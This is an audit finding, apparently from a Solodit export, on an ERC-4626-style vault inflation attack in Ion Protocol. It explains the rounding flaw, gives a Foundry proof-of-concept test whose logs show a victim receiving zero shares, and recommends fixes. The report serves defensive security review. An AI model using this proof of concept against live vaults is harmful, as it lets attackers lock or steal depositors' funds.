---
# Core Classification
protocol: Ionprotocol
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 36437
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/IonProtocol-security-review.md
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[M-03] Inflation attack in Vault

### Overview

The Vault contract has a bug that allows an attacker to manipulate the share values and cause losses for other users. This is because the contract uses a variable called `_decimalsOffset` to add more precision to share values, but if the underlying token has 18 decimals (which is common for many tokens), the value of `_decimalsOffset` will be 0. This means that when the contract calculates share values, it can be manipulated by depositing a small amount of tokens and then donating a large amount, causing a big division rounding error. This can result in the attacker locking a large amount of assets from another user at a relatively low cost. To fix this, it is recommended to set the value of `_decimalsOffset` to 6 or to implement an initial deposit of a small amount to mitigate this issue.

### Original Finding Content

**Severity**

**Impact:** High

**Likelihood:** Low

**Description**

The Vault contract uses `_decimalsOffset` to add more precision to share values. The issue is that the value of the `_decimalsOffset` would be 0 if the underlying token had 18 decimals (which is the case for WETH and most tokens). So share calculation would be:

```solidity
          assets.mulDiv(newTotalSupply + 1, newTotalAssets + 1, rounding)
```

And because the code uses `balanceOf(address(this))` to calculate IDLE pool allocation it would be possible to mint 1 wei share by depositing 1 wei token and then donate 100e18 tokens and inflate the PPS value and then when other users interact with the contract they will lose funds because big division rounding error.

```solidity
    function test_initial_deposit_grief() public {

        IIonPool[] memory market = new IIonPool[](1);
        market[0] = IDLE;

        uint256[] memory allocationCaps = new uint256[](1);
        allocationCaps[0] = 250e18;

        IIonPool[] memory queue = new IIonPool[](4);
        queue[0] = IDLE;
        queue[1] = weEthIonPool;
        queue[2] = rsEthIonPool;
        queue[3] = rswEthIonPool;

        vm.prank(OWNER);
        vault.addSupportedMarkets(market, allocationCaps, queue, queue);

        setERC20Balance(address(BASE_ASSET), address(this), 11e18 + 10);

        uint256 initialAssetBalance = BASE_ASSET.balanceOf(address(this));
        console.log("attacker balance before : ");
        console.log(initialAssetBalance);

        vault.mint(10, address(this));

        IERC20(address(BASE_ASSET)).transfer(address(vault), 11e18);

        address alice = address(0xabcd);
        setERC20Balance(address(BASE_ASSET), alice, 10e18 + 10);
        vm.startPrank(alice);
        IERC20(address(BASE_ASSET)).approve(address(vault), 1e18);
        vault.deposit(1e18, alice);
        vm.stopPrank();

        uint256 aliceShares = vault.balanceOf(alice);
        console.log("alice shares : ");
        console.log(aliceShares);

        vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
        uint256 afterAssetBalance = BASE_ASSET.balanceOf(address(this));
        console.log("attacker balance after : ");
        console.log(afterAssetBalance);

    }
```

Test Ouput :

```shell
Logs:
  attacker balance before :
  11000000000000000010
  alice shares :
  0
  attacker balance after :
  10909090909090909100
```

It can be observed that the attacker can lock `1 ETH` of Alice's assets at the cost of ~ `0.1 ETH`.

**Recommendations**

Set the value of `_decimalsOffset` to 6 or consider mitigating this with an initial deposit of a small amount

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | Ionprotocol |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/IonProtocol-security-review.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

